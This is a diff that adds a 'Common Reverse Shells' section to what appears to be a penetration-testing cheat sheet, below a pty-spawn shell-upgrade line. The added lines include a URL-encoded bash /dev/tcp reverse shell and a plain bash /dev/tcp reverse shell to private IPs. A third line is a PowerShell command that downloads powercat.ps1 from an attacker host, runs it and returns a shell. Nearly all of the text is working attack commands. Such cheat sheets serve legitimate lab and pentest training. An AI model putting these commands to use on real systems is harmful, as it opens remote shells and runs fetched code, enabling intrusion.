@@ -48,6 +48,17 @@
 
 `python -c 'import pty; pty.spawn("/bin/bash")'`
 
+**Common Reverse Shells**
+```
+bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.2%2F443%200%3E%261%27
+
+IEX(New-Object System.Net.Webclient).DownloadString("http://<attacker-IP>/powercat.ps1");powercat -c <attacker-IP> -p 4444 -e powershell
+
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+
+
+```
+
 **Miscellaneous**
 ```
 PostgreSQL:
